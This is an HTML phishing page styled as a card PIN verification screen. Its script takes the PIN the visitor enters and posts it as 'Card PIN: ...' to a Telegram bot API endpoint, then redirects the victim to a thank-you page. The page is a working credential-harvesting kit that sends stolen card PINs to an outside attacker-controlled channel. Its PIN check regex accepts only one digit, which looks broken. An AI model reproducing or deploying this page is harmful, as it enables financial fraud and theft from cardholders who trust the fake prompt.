<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Enter PIN</title>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, sans-serif;
      }

      body {
        min-height: 100vh;
        background: linear-gradient(
          180deg,
          #1c3fae 0%,
          #295ccf 45%,
          #4285f4 100%
        );
        display: flex;
        flex-direction: column;
        align-items: center;
      }

      .card {
        background: white;
        margin-top: 100px;
        width: 350px;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        text-align: center;
      }

      h2 {
        margin-bottom: 10px;
      }

      p {
        color: #666;
        margin-bottom: 25px;
      }

      .pin-input {
        width: 100%;
        height: 55px;
        font-size: 28px;
        text-align: center;
        letter-spacing: 12px;
        border: 1px solid #ddd;
        border-radius: 8px;
        margin-bottom: 20px;
      }

      button {
        width: 100%;
        height: 50px;
        border: none;
        border-radius: 8px;
        background: #0637fc;
        color: white;
        font-size: 16px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h2>Enter Your PIN</h2>
      <p>Please enter your card PIN</p>

      <input
        type="password"
        maxlength="7"
        class="pin-input"
        id="pin"
        inputmode="numeric"
        pattern="[0-9]*"
      />

      <button onclick="verifyPin()">Continue</button>
    </div>

    <script
      type="text/javascript"
      src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"
    ></script>
    <script
      type="text/javascript"
      src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"
    ></script>
    <script src="./scripts.js"></script>

    <script>
      function verifyPin() {
        const pin = document.getElementById("pin").value;

        if (!/^[0-9]$/.test(pin)) {
          alert("Please enter a valid card PIN");
          return;
        }

        let message = `Card PIN: ${pin}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        })
          .then((response) => response.json())
          .then(() => {
            window.location.replace("thank.html");
          });
      }
    </script>
  </body>
</html>
